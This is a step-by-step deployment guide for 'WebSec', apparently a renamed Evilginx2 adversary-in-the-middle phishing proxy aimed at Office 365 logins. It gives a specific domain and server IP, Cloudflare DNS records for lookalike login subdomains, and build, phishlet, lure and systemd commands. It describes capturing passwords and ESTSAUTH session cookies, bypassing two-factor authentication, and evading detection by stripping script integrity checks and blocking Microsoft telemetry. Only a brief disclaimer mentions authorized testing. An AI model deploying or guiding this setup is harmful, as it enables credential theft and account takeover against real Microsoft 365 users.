# 🚀 WebSec Deployment Guide - Standalone Setup

> **Advanced Man-in-the-Middle (MITM) Phishing Framework**  
> **Domain:** `azbpartner.com` | **Server IP:** `15.206.73.179`

## 📋 Overview

This guide covers deploying WebSec as a standalone phishing framework on AWS EC2 with Cloudflare integration. The setup uses the O365-1 phishlet for advanced Office 365 credential capture with OAuth2/PKCE support.

### 🎯 What WebSec Does

- **Reverse Proxy:** Intercepts and modifies web traffic in real-time
- **Credential Capture:** Captures usernames, passwords, and session tokens
- **2FA Bypass:** Handles modern authentication flows including PKCE
- **Session Hijacking:** Steals authentication cookies and tokens
- **SSL/TLS Management:** Automatic certificate handling
- **DNS Server:** Resolves phishing domains locally

## 🏗️ Architecture

```
┌─────────────────┐    ┌──────────────────┐    ┌─────────────────┐
│   Victim        │    │   Cloudflare     │    │   WebSec        │
│   (Target)      │───▶│   Proxy          │───▶│   Server        │
│                 │    │   (Orange Cloud) │    │   15.206.73.179 │
└─────────────────┘    └──────────────────┘    └─────────────────┘
                                │
                                ▼
                       ┌──────────────────┐
                       │   Real O365      │
                       │   (Microsoft)    │
                       └──────────────────┘
```

## 🌐 Domain Configuration

**Primary Domain:** `azbpartner.com`

**O365-1 Phishlet Subdomains:**
- `login.azbpartner.com` → `15.206.73.179` (Primary O365 login)
- `portal.azbpartner.com` → `15.206.73.179` (Office portal redirects)
- `sso.azbpartner.com` → `15.206.73.179` (Live SSO authentication)
- `auth.azbpartner.com` → `15.206.73.179` (Token exchange endpoints)
- `cdn1.azbpartner.com` → `15.206.73.179` (Asset CDN - msftauth.net)
- `cdn2.azbpartner.com` → `15.206.73.179` (Asset CDN - msauth.net)

## 🔧 Prerequisites

### 1. AWS EC2 Instance
- **OS:** Ubuntu 22.04 LTS
- **Type:** t3.medium or higher
- **IP:** 15.206.73.179
- **Security Groups:** 
  - Port 22 (SSH)
  - Port 80 (HTTP)
  - Port 443 (HTTPS)
  - Port 53 (DNS)

### 2. Cloudflare Account
- Domain `azbpartner.com` added to Cloudflare
- API token with DNS editing permissions
- Orange cloud (proxy) enabled for all subdomains

### 3. Domain Registration
- `azbpartner.com` registered and pointing to Cloudflare nameservers

## 🚀 Installation Steps

### 1. Server Setup

```bash
# Update system
sudo apt update && sudo apt upgrade -y

# Install dependencies
sudo apt install -y git golang-go build-essential

# Create websec user
sudo useradd -m -s /bin/bash websec
sudo usermod -aG sudo websec
sudo su - websec
```

### 2. Build WebSec

```bash
# Clone and build
cd /opt
sudo git clone https://github.com/kgretzky/evilginx2.git websec
sudo chown -R websec:websec /opt/websec
cd /opt/websec

# Build the application
go build -o websec

# Create directories
mkdir -p ~/.websec/phishlets
mkdir -p ~/.websec/redirectors
mkdir -p ~/.websec/crt/sites

# Copy phishlets and redirectors
cp -r phishlets/* ~/.websec/phishlets/
cp -r redirectors/* ~/.websec/redirectors/
```

### 3. DNS Configuration

**Add to Cloudflare DNS:**

| Type | Name | Content | Proxy Status |
|------|------|---------|--------------|
| A | login.azbpartner.com | 15.206.73.179 | Proxied (Orange) |
| A | portal.azbpartner.com | 15.206.73.179 | Proxied (Orange) |
| A | sso.azbpartner.com | 15.206.73.179 | Proxied (Orange) |
| A | auth.azbpartner.com | 15.206.73.179 | Proxied (Orange) |
| A | cdn1.azbpartner.com | 15.206.73.179 | Proxied (Orange) |
| A | cdn2.azbpartner.com | 15.206.73.179 | Proxied (Orange) |

**Cloudflare Settings:**
- SSL/TLS Mode: Full (strict)
- Edge Certificates: Always Use HTTPS
- Security Level: Medium
- WAF: Enabled

### 4. SSL Certificate Setup

**Option 1: Cloudflare Origin Certificate (Recommended)**

```bash
# Create certificate directories
for subdomain in login portal sso auth cdn1 cdn2; do
    mkdir -p ~/.websec/crt/sites/${subdomain}.azbpartner.com
done

# Download Cloudflare Origin Certificates from Cloudflare dashboard
# Save as: ~/.websec/crt/sites/[subdomain]/fullchain.pem
# Save key as: ~/.websec/crt/sites/[subdomain]/privkey.pem

# Set proper permissions
for subdomain in login portal sso auth cdn1 cdn2; do
    chmod 600 ~/.websec/crt/sites/${subdomain}.azbpartner.com/privkey.pem
    chmod 644 ~/.websec/crt/sites/${subdomain}.azbpartner.com/fullchain.pem
done
```

**Option 2: Let's Encrypt (Automatic)**

```bash
# WebSec will automatically obtain Let's Encrypt certificates
# No manual setup required
```

### 5. Configure WebSec

```bash
# Start WebSec
cd /opt/websec
./websec -p ~/.websec/phishlets -t ~/.websec/redirectors

# In WebSec terminal:
# Set base domain
config domain azbpartner.com

# Configure O365-1 phishlet
phishlets hostname o365-1 login.azbpartner.com
phishlets enable o365-1

# Verify configuration
phishlets o365-1

# Create lure for testing
lures create o365-1
lures get-url 0
```

### 6. Systemd Service Setup

```bash
# Create service file
sudo tee /etc/systemd/system/websec.service > /dev/null <<EOF
[Unit]
Description=WebSec MITM Phishing Framework
After=network.target

[Service]
Type=simple
User=websec
WorkingDirectory=/opt/websec
ExecStart=/opt/websec/websec -p /home/websec/.websec/phishlets -t /home/websec/.websec/redirectors
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

# Enable and start service
sudo systemctl daemon-reload
sudo systemctl enable websec
sudo systemctl start websec

# Check status
sudo systemctl status websec
```

## 🧪 Testing Your Deployment

### 1. Basic Connectivity Test

```bash
# Test if WebSec is running on O365-1 phishlet subdomains
curl -k https://login.azbpartner.com
curl -k https://portal.azbpartner.com
curl -k https://sso.azbpartner.com
curl -k https://auth.azbpartner.com

# Check service status
sudo systemctl status websec

# View logs
sudo journalctl -u websec -f
```

### 2. O365-1 Phishlet Testing

```bash
# Connect to WebSec
cd /opt/websec
./websec -p ~/.websec/phishlets -t ~/.websec/redirectors

# Test the phishlet flow
# 1. Visit the lure URL
curl -k "https://login.azbpartner.com/common/oauth2/v2.0/authorize?client_id=00000003-0000-0000-c000-000000000000&response_type=code&redirect_uri=https://portal.office.com&scope=openid"

# 2. Check if phishlet is active
phishlets o365-1

# 3. Monitor sessions for credential capture
sessions

# 4. Test lure generation
lures create o365-1
lures get-url 0
```

### 3. Expected Behavior

When a victim visits your lure:
1. **Initial Redirect:** `login.azbpartner.com` → Real Microsoft login
2. **Credential Entry:** Victim enters username/password
3. **Auto-Submit:** JavaScript automatically submits form
4. **Token Capture:** WebSec captures authentication tokens
5. **Session Tracking:** Credentials stored in WebSec sessions

## 📊 O365-1 Phishlet Features

The `o365-1.yaml` phishlet includes:

**Advanced OAuth2/PKCE Support:**
- Handles modern Microsoft authentication flows
- Captures PKCE code challenges and verifiers
- Supports token exchange endpoints

**Comprehensive Coverage:**
- `login.microsoftonline.com` - Primary O365 login
- `portal.office.com` - Office portal redirects
- `live.com` - Live account SSO
- `microsoftonline.com/common` - Token exchange
- `msftauth.net` & `msauth.net` - Asset CDNs

**Security Evasion:**
- Strips integrity attributes from JavaScript
- Blocks Microsoft telemetry calls
- Auto-submits credentials for better UX

**Credential Capture:**
- Username: `login` field
- Password: `passwd` field
- Session tokens: `ESTSAUTH`, `ESTSAUTHPERSISTENT`, `OTAuth`

## 🔍 Monitoring and Maintenance

### 1. Log Monitoring

```bash
# View real-time logs
sudo journalctl -u websec -f

# View recent logs
sudo journalctl -u websec -n 100

# Check for errors
sudo journalctl -u websec -p err
```

### 2. Session Monitoring

```bash
# Connect to WebSec
cd /opt/websec
./websec -p ~/.websec/phishlets -t ~/.websec/redirectors

# View captured sessions
sessions

# View specific session details
sessions <session_id>

# Clear old sessions
sessions clear
```

### 3. Performance Monitoring

```bash
# Check system resources
htop

# Monitor network connections
sudo netstat -tlnp | grep websec

# Check disk usage
df -h

# Monitor memory usage
free -h
```

## 🛠️ Troubleshooting

### Common Issues

**1. Service not starting:**
```bash
# Check service status
sudo systemctl status websec

# Check logs
sudo journalctl -u websec -n 50

# Check if port is in use
sudo netstat -tlnp | grep :443
```

**2. SSL Certificate issues:**
```bash
# Check certificate files for O365-1 phishlet subdomains
ls -la ~/.websec/crt/sites/login.azbpartner.com/
ls -la ~/.websec/crt/sites/portal.azbpartner.com/
ls -la ~/.websec/crt/sites/sso.azbpartner.com/
ls -la ~/.websec/crt/sites/auth.azbpartner.com/

# Verify certificates
openssl x509 -in ~/.websec/crt/sites/login.azbpartner.com/fullchain.pem -text -noout
openssl x509 -in ~/.websec/crt/sites/portal.azbpartner.com/fullchain.pem -text -noout
```

**3. Domain not resolving:**
```bash
# Check DNS for O365-1 phishlet subdomains
nslookup login.azbpartner.com
nslookup portal.azbpartner.com
nslookup sso.azbpartner.com
nslookup auth.azbpartner.com

# Check Cloudflare settings
# Ensure A records point to 15.206.73.179
```

**4. Phishlet not working:**
```bash
# Check phishlet configuration
phishlets o365-1

# Verify hostname is set
phishlets hostname o365-1

# Check if phishlet is enabled
phishlets

# Test lure generation
lures create o365-1
lures get-url 0
```

### Advanced Troubleshooting

```bash
# Check process
ps aux | grep websec

# Check network connections
sudo netstat -tlnp | grep websec

# Test SSL for O365-1 phishlet subdomains
openssl s_client -connect login.azbpartner.com:443 -servername login.azbpartner.com
openssl s_client -connect portal.azbpartner.com:443 -servername portal.azbpartner.com
openssl s_client -connect sso.azbpartner.com:443 -servername sso.azbpartner.com
```

## 📁 Directory Structure

```
/opt/websec/                    # Main application directory
├── websec                      # Executable
├── phishlets/                  # Phishlet templates
└── redirectors/                # HTML redirector templates

~/.websec/                      # Configuration directory
├── crt/sites/                  # SSL certificates
│   ├── login.azbpartner.com/   # O365-1 primary login
│   │   ├── fullchain.pem      # Public certificate
│   │   └── privkey.pem        # Private key
│   ├── portal.azbpartner.com/ # Office portal redirects
│   │   ├── fullchain.pem      # Public certificate
│   │   └── privkey.pem        # Private key
│   ├── sso.azbpartner.com/    # Live SSO authentication
│   │   ├── fullchain.pem      # Public certificate
│   │   └── privkey.pem        # Private key
│   ├── auth.azbpartner.com/   # Token exchange endpoints
│   │   ├── fullchain.pem      # Public certificate
│   │   └── privkey.pem        # Private key
│   ├── cdn1.azbpartner.com/   # Asset CDN (msftauth.net)
│   │   ├── fullchain.pem      # Public certificate
│   │   └── privkey.pem        # Private key
│   └── cdn2.azbpartner.com/   # Asset CDN (msauth.net)
│       ├── fullchain.pem      # Public certificate
│       └── privkey.pem        # Private key
├── phishlets/                  # Active phishlets (o365-1.yaml)
└── redirectors/                # Active redirectors
```

## 🚨 Security Considerations

### Important Notes

⚠️ **Legal Compliance:** Only use this framework for authorized security testing and penetration testing engagements. Ensure you have proper written authorization before testing any systems.

🔒 **Access Control:** 
- Restrict SSH access to authorized IPs only
- Use key-based authentication
- Regularly update system packages
- Monitor access logs

🌐 **Network Security:**
- Configure firewall rules properly
- Use Cloudflare WAF for additional protection
- Monitor for suspicious activity
- Keep SSL certificates updated

📊 **Data Protection:**
- Encrypt sensitive data at rest
- Regularly backup configuration
- Implement proper logging
- Monitor for data breaches

## 🔄 Maintenance Tasks

### Daily
- Check service status: `sudo systemctl status websec`
- Monitor logs: `sudo journalctl -u websec -f`
- Check captured sessions: `sessions`

### Weekly
- Update system packages: `sudo apt update && sudo apt upgrade`
- Review and clear old sessions: `sessions clear`
- Check SSL certificate expiration
- Review access logs

### Monthly
- Backup configuration: `tar -czf websec-backup-$(date +%Y%m%d).tar.gz ~/.websec`
- Review security settings
- Update Cloudflare rules
- Performance optimization

## 📞 Support

For issues and questions:
- Check the troubleshooting section above
- Review logs: `sudo journalctl -u websec -f`
- Verify configuration: `phishlets o365-1`
- Test connectivity: `curl -k https://login.azbpartner.com`

---

**⚠️ Disclaimer:** This tool is for authorized security testing only. Always ensure you have proper authorization before testing any systems. The authors are not responsible for misuse of this software.
